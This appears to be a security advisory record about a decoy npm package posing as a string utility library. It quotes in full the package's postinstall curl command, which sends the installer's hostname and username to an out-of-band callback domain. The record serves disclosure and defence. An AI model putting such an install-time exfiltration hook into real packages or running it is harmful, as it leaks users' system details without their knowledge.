  "summary": "Security-research / proof-of-concept package: @test1230504/probe-7f3k2m-utils (npm)",
  "details": "The package's postinstall hook (postinstall.js) executes a curl command that exfiltrates the installer's hostname and username to an external OAST callback domain. On install, it runs: curl -s \"hxxp://pzs5w7ntzhsnepwk564lyfdci3oucl0a[.]oastify[.]com/probe?h=$(hostname)\u0026u=$(whoami)\". The domain pzs5w7ntzhsnepwk564lyfdci3oucl0a[.]oastify[.]com is an interactsh/out-of-band application security testing endpoint, used here as a data exfiltration sink. The package is a decoy described as a \"string utility library\" with no repository and no functional utility code.",
